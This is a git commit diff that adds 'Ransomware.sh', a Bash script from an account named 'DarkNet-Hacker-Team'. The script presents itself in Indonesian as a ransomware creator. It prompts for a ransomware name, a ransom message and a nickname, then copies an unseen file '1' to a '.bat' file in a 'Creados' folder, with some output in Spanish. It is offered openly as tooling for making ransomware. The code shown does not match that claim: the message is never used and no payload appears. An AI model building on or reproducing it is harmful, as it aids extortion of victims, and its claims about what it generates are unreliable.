730e9a93ffa72c2112ee6d076139b7e7b2eb6dff
DarkNet-Hacker-Team <44440552+DarkNet-Hacker-Team@users.noreply.github.com>
2019-03-22 18:27:43 +0700

    Add files via upload

---
+++ Ransomware.sh
@@ -0,0 +1,39 @@
+clear
+echo "Pencipta Ransomware"
+echo " "
+echo "by 5H311_1NJ3C706"
+echo " "
+echo "Instruksi:"
+echo "1)Tempatkan nama ransomware Anda"
+echo "2)Tempatkan pesan ransomware Anda"
+echo "3)Masukkan nama Nickname Anda"
+echo "4)Dan ransomware siap dibuat"
+echo "PERINGATAN:Jika Anda tidak memasukkan data dengan baik"
+echo "data dalam ransomware akan muncul dengan tanda-tanda"
+echo "interogasi."
+echo " "
+echo "Masukkan nama ransomware Anda:"
+echo " "
+read input
+echo " "
+echo "Masukkan pesan yang akan dikatakan ransomware Anda:"
+echo " "
+read input1
+echo " "
+echo "Masukkan nama Nickname Anda:"
+echo " "
+read input2
+echo " "
+clear
+echo "Pencipta Ransomware"
+echo " "
+echo "by 5H311_1NJ3C706"
+echo " "
+echo "Generando $input1..."
+mkdir Creados
+cp 1 $input.bat
+mv $input.bat Creados
+echo " "
+echo "$input creado exitosamente..."
+echo "Saliendo..."
+
